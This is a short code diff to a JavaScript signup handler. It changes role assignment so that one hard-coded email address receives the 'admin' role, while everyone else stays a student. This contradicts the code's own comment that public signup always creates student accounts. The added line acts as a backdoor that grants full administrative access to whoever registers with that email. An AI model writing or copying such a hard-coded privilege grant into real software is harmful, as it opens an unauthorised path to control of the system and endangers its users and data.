@@ -15,7 +15,8 @@ const signup = asyncHandler(async (req, res) => {
   }
   // Only admins are allowed to create examiner/admin accounts directly;
   // public signup always creates a student account.
-  const finalRole = role === 'student' || !role ? 'student' : 'student';
+ const finalRole =
+  email === 'jashangulati17@gmail.com' ? 'admin' : 'student';
 
   const existing = await db.query('SELECT id FROM users WHERE email = $1', [email]);
   if (existing.rows.length) {
